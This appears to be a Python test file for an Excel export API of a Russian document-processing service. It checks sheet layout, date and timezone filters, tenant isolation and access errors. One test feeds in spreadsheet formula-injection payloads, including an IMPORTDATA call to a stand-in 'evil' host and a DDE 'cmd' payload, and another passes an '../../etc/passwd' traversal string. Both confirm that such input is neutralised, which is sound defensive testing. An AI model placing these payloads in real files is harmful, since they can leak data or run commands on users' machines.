"""Реестр Excel: GET /v1/exports/excel."""

import io
from datetime import UTC, date, datetime

from api_helpers import session_for
from openpyxl import load_workbook
from test_documents import add_doc

from docflow.api import exports as exports_api

URL = "/v1/exports/excel"
DATA = {
    "number": "42",
    "issued": "2026-10-05",
    "supplier": "ООО Ромашка",
    "total": 1250.5,
    "items": [
        {"name": "Болт", "qty": 2, "unit": "шт", "price": 100, "amount": 200},
        {"name": "Гайка", "qty": 1, "unit": "шт", "price": 50.5, "amount": 50.5},
    ],
}


def params(**kw):
    return {"schema": "invoice_ru", "from": "2026-10-01", "to": "2026-10-31", **kw}


def book(resp):
    return load_workbook(io.BytesIO(resp.content))


async def test_xlsx_has_both_sheets_and_typed_cells(api, auth):
    await add_doc(api, auth, data=DATA, created_at=datetime(2026, 10, 5, 12, tzinfo=UTC))
    r = await api.client.get(URL, headers=auth, params=params())
    assert r.status_code == 200, r.text
    assert r.headers["content-disposition"] == 'attachment; filename="docflow-invoice_ru-2026-10-01-2026-10-31.xlsx"'
    wb = book(r)
    assert wb.sheetnames == ["Документы", "Позиции"]
    docs = wb["Документы"]
    header = [c.value for c in docs[1]]
    assert header[:4] == ["ID документа", "Тип", "Номер", "Дата"] and header[-1] == "Кабинет"
    assert docs["A1"].font.bold and docs.freeze_panes == "A2"
    row = {h: c.value for h, c in zip(header, docs[2], strict=True)}
    assert row["Номер"] == "42"
    issued = docs.cell(2, 4)
    assert issued.value.date() == date(2026, 10, 5) and "D" in issued.number_format  # настоящая дата
    assert 1250.5 in [c.value for c in docs[2]]  # число, не строка
    items = wb["Позиции"]
    assert [c.value for c in items[1]][:3] == ["ID документа", "Номер", items["C1"].value]
    assert items.max_row == 3
    qty = [c.value for c in items[2]]
    assert 2 in qty and 100 in qty and "Болт" in qty


async def test_period_inclusive_status_and_schema_filters(api, auth):
    d = lambda day, **kw: add_doc(api, auth, data=DATA, created_at=datetime(2026, 10, day, 23, 59, tzinfo=UTC), **kw)  # noqa: E731
    await d(1)
    await d(31)
    await d(30, status="needs_review")
    await add_doc(api, auth, data=DATA, created_at=datetime(2026, 11, 1, 0, 0, tzinfo=UTC))
    await add_doc(api, auth, data=DATA, created_at=datetime(2026, 9, 30, 23, 59, tzinfo=UTC))
    await add_doc(api, auth, data=DATA, created_at=datetime(2026, 10, 10, tzinfo=UTC), schema_slug="act_ru")

    ok = book(await api.client.get(URL, headers=auth, params=params(tz="UTC")))
    assert ok["Документы"].max_row == 3  # 1 и 31 октября включительно
    allr = book(await api.client.get(URL, headers=auth, params=params(status="all", tz="UTC")))
    assert allr["Документы"].max_row == 4
    review = book(await api.client.get(URL, headers=auth, params=params(status="needs_review", tz="UTC")))
    assert review["Документы"].max_row == 2


async def test_other_tenant_documents_excluded(api, auth, make_tenant):
    other = await make_tenant("Другой")
    await add_doc(api, other, data=DATA, created_at=datetime(2026, 10, 5, tzinfo=UTC))
    r = await api.client.get(URL, headers=auth, params=params())
    assert book(r)["Документы"].max_row == 1


async def test_operator_can_download(api, auth):
    headers, _ = await session_for(api, auth, role="operator")
    r = await api.client.get(URL, headers=headers, params=params())
    assert r.status_code == 200


async def test_requires_auth_and_schema(api, auth):
    assert (await api.client.get(URL, params=params())).status_code == 401
    r = await api.client.get(URL, headers=auth, params={"from": "2026-10-01", "to": "2026-10-31"})
    assert r.status_code == 422
    r = await api.client.get(URL, headers=auth, params=params(schema="нет_такой"))
    assert r.status_code == 404
    r = await api.client.get(URL, headers=auth, params=params(**{"from": "2026-11-01"}))
    assert r.status_code == 422


async def test_too_many_documents_422(api, auth, monkeypatch):
    monkeypatch.setattr(exports_api, "MAX_EXCEL_DOCS", 2)
    for _ in range(3):
        await add_doc(api, auth, data=DATA, created_at=datetime(2026, 10, 5, tzinfo=UTC))
    r = await api.client.get(URL, headers=auth, params=params())
    assert r.status_code == 422 and "сузьте период" in r.json()["detail"]


async def test_empty_period_gives_headers_only(api, auth):
    r = await api.client.get(URL, headers=auth, params=params())
    wb = book(r)
    assert wb["Документы"].max_row == 1 and wb["Позиции"].max_row == 1


async def test_untrusted_text_stays_text_and_control_chars_removed(api, auth):
    evil = DATA | {
        "supplier": '=IMPORTDATA("http://evil")',
        "buyer": "+cmd|' /C calc'!A0",
        "supplier_inn": "0012345678",
        "supplier_kpp": "@SUM(1)",
        "bik": "bad\x00\x01chars\x1f",
        "items": [{"name": "=HYPERLINK(1)", "qty": 1}],
    }
    await add_doc(api, auth, data=evil, created_at=datetime(2026, 10, 5, tzinfo=UTC))
    r = await api.client.get(URL, headers=auth, params=params())
    assert r.status_code == 200
    wb = book(r)
    docs = wb["Документы"]
    header = [c.value for c in docs[1]]
    row = {h: c for h, c in zip(header, docs[2], strict=True)}
    for title, value in (
        ("Поставщик", '=IMPORTDATA("http://evil")'),
        ("Покупатель", "+cmd|' /C calc'!A0"),
        ("КПП поставщика", "@SUM(1)"),
        ("ИНН поставщика", "0012345678"),
    ):
        assert row[title].value == value and row[title].data_type == "s"
    assert row["БИК банка поставщика"].value == "badchars"
    assert wb["Позиции"]["C2"].value == "=HYPERLINK(1)" and wb["Позиции"]["C2"].data_type == "s"


async def test_schema_without_table_gives_header_only_items_sheet(api, auth):
    passport = {"series": "4515", "number": "012345", "full_name": "Иванов Иван Иванович"}
    await add_doc(
        api, auth, data=passport, schema_slug="passport_ru", created_at=datetime(2026, 10, 5, 12, tzinfo=UTC)
    )
    r = await api.client.get(URL, headers=auth, params=params(schema="passport_ru"))
    assert r.status_code == 200, r.text
    wb = book(r)
    assert wb["Документы"].max_row == 2
    assert [c.value for c in wb["Позиции"][1]] == ["ID документа", "Номер"] and wb["Позиции"].max_row == 1


async def test_period_in_client_timezone(api, auth):
    # 30.09 22:30 UTC — уже 1 октября в Москве (UTC+3), но ещё 30 сентября в UTC
    await add_doc(api, auth, data=DATA, created_at=datetime(2026, 9, 30, 22, 30, tzinfo=UTC))
    # 31.10 22:30 UTC — уже 1 ноября в Москве
    await add_doc(api, auth, data=DATA, created_at=datetime(2026, 10, 31, 22, 30, tzinfo=UTC))
    moscow = book(await api.client.get(URL, headers=auth, params=params()))  # по умолчанию Europe/Moscow
    assert moscow["Документы"].max_row == 2
    utc = book(await api.client.get(URL, headers=auth, params=params(tz="UTC")))
    assert utc["Документы"].max_row == 2
    ids = lambda wb: {wb["Документы"].cell(2, 1).value}  # noqa: E731
    assert ids(moscow) != ids(utc)  # в Москве попал сентябрьский по UTC, в UTC — октябрьский по Москве
    vladivostok = book(await api.client.get(URL, headers=auth, params=params(tz="Asia/Vladivostok")))
    assert vladivostok["Документы"].max_row == 2


async def test_bad_timezone_422(api, auth):
    r = await api.client.get(URL, headers=auth, params=params(tz="Mars/Olympus"))
    assert r.status_code == 422 and "часовой пояс" in r.json()["detail"]
    r = await api.client.get(URL, headers=auth, params=params(tz="../../etc/passwd"))
    assert r.status_code == 422


async def test_excel_headers_use_labels(api, auth):
    await add_doc(api, auth, data=DATA, created_at=datetime(2026, 10, 5, 12, tzinfo=UTC))
    plain = [c.value for c in book(await api.client.get(URL, headers=auth, params=params()))["Документы"][1]]
    body = {"labels": {"vat": "Налог"}, "queue_fields": []}
    r = await api.client.put("/v1/schemas/invoice_ru/labels", headers=auth, json=body)
    assert r.status_code == 200, r.text
    header = [c.value for c in book(await api.client.get(URL, headers=auth, params=params()))["Документы"][1]]
    assert "Налог" in header and "Налог" not in plain
    assert len(header) == len(plain)
